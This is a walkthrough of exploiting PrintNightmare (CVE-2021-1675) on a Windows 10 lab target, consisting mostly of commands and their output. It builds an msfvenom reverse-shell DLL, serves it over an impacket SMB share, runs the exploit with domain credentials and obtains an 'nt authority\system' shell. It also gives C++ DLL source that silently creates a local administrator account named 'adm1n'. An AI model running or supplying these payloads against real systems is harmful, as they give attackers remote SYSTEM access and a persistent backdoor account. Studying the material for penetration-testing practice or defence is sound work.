Best installation : https://github.com/cube0x0/CVE-2021-1675/issues/19

Create a dll for reverse connection

	┌──(kali㉿kali)-[~/Desktop/printnightmare rce/smb]
	└─$ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.200.101 LPORT=4444 -f dll -o reverse.dll
	[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
	No encoder specified, outputting raw payload
	Payload size: 460 bytes
	Final size of dll file: 8704 bytes
	Saved as: reverse.dll


Start listener

	┌──(kali㉿kali)-[~/Desktop/printnightmare rce/smb]
	└─$ nc -lvnp 4444                 
	listening on [any] 4444 ...


Start smb server for sharing dll

	┌──(kali㉿kali)-[~/Desktop/printnightmare rce]
	└─$ sudo /usr/bin/impacket-smbserver share smb -smb2support
	Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

	[*] Config file parsed
	[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
	[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
	[*] Config file parsed
	[*] Config file parsed
	[*] Config file parsed


Run exploit (i got error but still could get reverse shell somehow)

	┌──(PrintNightmare)(kali㉿kali)-[~/Desktop/printnightmare rce/CVE-2021-1675]
	└─$ python CVE-2021-1675.py valhalla/testuser:'Pass123!'@192.168.200.112 '\\192.168.200.101\share\reverse.dll'          
	[*] Connecting to ncacn_np:192.168.200.112[\PIPE\spoolss]
	[+] Bind OK
	[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_c62e9f8067f98247\Amd64\UNIDRV.DLL
	[*] Executing \??\UNC\192.168.200.101\share\reverse.dll
	[*] Try 1...
	[*] Stage0: 0
	[*] Try 2...
	
Check back netcat listener

	┌──(kali㉿kali)-[~/Desktop/printnightmare rce/smb]
	└─$ nc -lvnp 4444
	listening on [any] 4444 ...
	connect to [192.168.200.101] from (UNKNOWN) [192.168.200.112] 62863
	Microsoft Windows [Version 10.0.19043.928]
	(c) Microsoft Corporation. All rights reserved.

	C:\Windows\system32>whoami
	whoami
	nt authority\system

	C:\Windows\system32>


You can create your own dll with visual studio. Just create a dll project for c++ and copy code below. Select release and x64 then build it

	#include "pch.h"
	#include <stdlib.h>

	BOOL APIENTRY DllMain(HMODULE hModule,
		DWORD  ul_reason_for_call,
		LPVOID lpReserved
	)
	{
		switch (ul_reason_for_call)
		{
		case DLL_PROCESS_ATTACH:
			system("cmd.exe /c net user adm1n Password123. /add");
			system("cmd.exe /c net localgroup administrators adm1n /add");
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
		}
		return TRUE;
	}
	

run exploit

	┌──(PrintNightmare)(kali㉿kali)-[~/Desktop/printnightmare rce/CVE-2021-1675]
	└─$ python CVE-2021-1675.py valhalla/testuser:'Pass123!'@192.168.200.112 '\\192.168.200.101\share\adduser.dll'                                   1 ⨯
	[*] Connecting to ncacn_np:192.168.200.112[\PIPE\spoolss]
	[+] Bind OK
	[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_c62e9f8067f98247\Amd64\UNIDRV.DLL
	[*] Executing \??\UNC\192.168.200.101\share\adduser.dll
	[*] Try 1...
	[*] Stage0: 0
	[*] Try 2...
	[*] Stage0: 0
	[*] Stage2: 0
	[+] Exploit Completed


check current users in target machine

	C:\Users\testuser>net user adm1n
	User name                    adm1n
	Full Name
	Comment
	User's comment
	Country/region code          000 (System Default)
	Account active               Yes
	Account expires              Never

	Password last set            22/09/2021 14:48:05
	Password expires             03/11/2021 14:48:05
	Password changeable          23/09/2021 14:48:05
	Password required            Yes
	User may change password     Yes

	Workstations allowed         All
	Logon script
	User profile
	Home directory
	Last logon                   Never

	Logon hours allowed          All

	Local Group Memberships      *Administrators       *Users
	Global Group memberships     *None
	The command completed successfully.
